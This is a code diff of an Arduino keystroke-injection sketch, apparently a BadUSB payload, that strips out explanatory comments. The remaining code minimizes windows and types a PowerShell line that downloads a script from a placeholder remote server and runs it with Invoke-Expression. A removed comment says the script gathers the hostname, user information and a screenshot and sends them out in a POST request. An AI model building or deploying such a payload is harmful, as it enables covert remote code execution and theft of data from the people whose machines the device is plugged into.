@@ -1,15 +1,13 @@
 #include <Keyboard.h> 
 
-// Init function
+
 void setup()
 {
-  // Begining the stream
+
   Keyboard.begin();
 
-  // Waiting 500ms for init
   delay(500);
 
-  // Ducky Script to gather hostname, user info, screenshot and send as a JSON POST request
   delay(1000);
 
   // Minimize all windows
@@ -32,7 +30,6 @@ void setup()
 
   delay(1000);
 
-  // PowerShell Script to gather information, take a screenshot and send POST request
   Keyboard.print("$scriptUrl = 'http://{{your-remote-server-ip}}:5000/uploads/run.ps1'; Invoke-Expression -Command (Invoke-RestMethod -Uri $scriptUrl)");
 
   typeKey(KEY_RETURN);
